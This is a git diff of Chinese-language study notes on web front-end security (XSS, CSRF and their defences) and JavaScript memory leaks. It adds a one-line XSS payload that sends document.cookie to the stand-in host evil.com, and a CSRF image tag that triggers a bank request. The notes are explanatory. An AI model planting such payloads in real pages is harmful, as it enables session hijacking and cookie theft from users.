@@ -2,7 +2,13 @@
 
 ---
 
-Cross-Site Scripting 往页面注入恶意代码, 可以获得 cookie 等
+Cross-Site Scripting 往页面注入恶意代码, 可以获得 cookie 等, 例如:
+
+```JavaScript
+(new Image()).src="evil.com/cookie?c="+document.cookie
+```
+
+[代码来自 mdn](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies#会话劫持和XSS)
 
 ### 攻击形式
 
@@ -19,7 +25,7 @@ Cross-Site Scripting 往页面注入恶意代码, 可以获得 cookie 等
 - Content Security Policy
 - 内容长度控制
 
-> [来源](https://tech.meituan.com/2018/09/27/fe-security.html) 挺专业的, 看起来挺复杂, 但是讲得很清楚
+> [来源](https://tech.meituan.com/2018/09/27/fe-security.html)
 
 ## csrf
 
@@ -29,14 +35,13 @@ cross-site request forgery, 跨站请求伪造, 俗话说就是盗用身份, 以
 
 - 登录网站 A, 生成 cookie
 - 在 cookie 没有过期的时间访问危险网站 B
-- 网站使用你的 cookie 发送请求
+- 网站使用你的 cookie 发送请求, 例如`<img src="bank.com/dosomething">`
 
 ### 防御手段
 
-- 服务端
-  - cookie hashing
-  - 验证码
-  - tokens, 就是隐藏一个 token, 提交时要带上它, 其实这些防爬虫也用
+- cookie hashing
+- 验证码
+- token, 就是隐藏一个 token, 提交时要带上它, 其实这些防爬虫也用
 
 > [来源](https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html)
 
@@ -112,7 +117,23 @@ cross-site request forgery, 跨站请求伪造, 俗话说就是盗用身份, 以
 
 ---
 
-指变量占用内存却没有回收
+指变量占用内存却没有回收, 有以下几种情况
+
+- 在函数内声明了全局变量
+- 计时器与回调函数中的对象引用
+- DOM 节点存储
+
+> [来源](https://github.com/wengjq/Blog/issues/1)
+
+### 检测内存泄漏的方法
+
+- Memory, 可以拍摄快照
+- record heap allocation
+- chrome 的任务管理器
+
+> [来源](https://juejin.im/post/5b20d9456fb9a01e554c112c)
+
+> [JS 内存泄漏排查方法](https://cloud.tencent.com/developer/article/1444558)
 
 ## HSTS
 
